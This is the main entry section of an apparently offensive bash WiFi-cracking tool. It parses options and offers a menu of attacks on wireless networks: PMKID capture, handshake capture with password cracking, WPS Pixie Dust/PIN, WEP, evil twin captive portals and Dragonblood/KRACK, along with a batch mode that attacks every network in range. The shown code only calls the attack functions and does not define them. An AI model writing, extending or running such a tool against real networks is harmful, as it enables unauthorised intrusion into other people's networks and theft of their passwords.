# Main Entry Point

show_usage() {
    echo "Usage: sudo $0 [OPTIONS]"
    echo ""
    echo "Options:"
    echo "  -i INTERFACE    Wireless interface to use"
    echo "  -w WORDLIST     Path to wordlist"
    echo "  -d COUNT        Deauth packet count (default: 10)"
    echo "  -t TIMEOUT      Capture timeout (default: 60s)"
    echo "  -b              Batch mode (attack all networks)"
    echo "  -h              Show this help"
    echo ""
}

parse_arguments() {
    local batch_mode=false
    
    while getopts "i:w:d:t:bh" opt; do
        case $opt in
            i) INTERFACE="$OPTARG" ;;
            w) WORDLIST="$OPTARG" ;;
            d) DEAUTH_COUNT="$OPTARG" ;;
            t) CAPTURE_DURATION="$OPTARG" ;;
            b) batch_mode=true ;;
            h) show_usage; exit 0 ;;
            *) show_usage; exit 1 ;;
        esac
    done
    
    if [ "$batch_mode" = true ]; then
        ATTACK_MODE="batch"
    fi
}

main() {
    print_banner
    parse_arguments "$@"
    
    # Pre-flight checks
    check_root
    check_dependencies
    auto_setup
    initialize_statistics
    
    # Enable multi-band support
    enable_multi_band_support
    
    # Wordlist check
    check_wordlist
    
    # Legal warning
    legal_warning
    
    # Batch mode
    if [ "$ATTACK_MODE" = "batch" ]; then
        select_interface
        enable_monitor_mode
        scan_networks_multi_band
        batch_attack_mode
        display_statistics
        cleanup_and_exit
    fi
    
    # Normal mode
    if [ -z "$INTERFACE" ]; then
        select_interface
    fi
    
    enable_monitor_mode
    
    # Multi-band scanning
    scan_networks_multi_band
    parse_and_select_target
    
    # Detect WiFi generation
    detect_wifi_generation "$TARGET_BSSID" "$TARGET_CHANNEL"
    
    # Attack mode selection
    echo ""
    log_info "Select Attack Method:"
    echo ""
    echo "  1) Auto (generation-aware attack selection)"
    echo "  2) PMKID Attack (clientless, fast)"
    echo "  3) Handshake Capture (traditional)"
    echo "  4) WPS Attack (Pixie Dust / PIN)"
    echo "  5) WEP Attack (legacy networks)"
    echo "  6) Evil Twin / Captive Portal"
    echo "  7) Novel Attacks (Dragonblood, KRACK, etc.)"
    echo ""
    
    read -p "Select attack [1]: " attack_choice
    attack_choice=${attack_choice:-1}
    
    case $attack_choice in
        1) 
            # Generation-aware auto mode
            if attack_by_wifi_generation; then
                :
            else
                # Fallback to standard auto
                if attack_pmkid; then
                    crack_hashcat || crack_password
                elif attack_wps; then
                    :
                else
                    capture_handshake && crack_password
                fi
            fi
            ;;
        2) attack_pmkid && { HASHCAT_HASH_FILE="${PMKID_FILE}.hc22000"; crack_hashcat || crack_password; } ;;
        3) capture_handshake && crack_password ;;
        4) attack_wps ;;
        5) attack_wep ;;
        6) attack_evil_twin ;;
        7) select_novel_attack ;;
        *)
            log_error "Invalid selection"
            cleanup_and_exit
            ;;
    esac
    
    # Save session and display stats
    save_session
    display_statistics
    cleanup_and_exit
}

# Run main
main "$@"
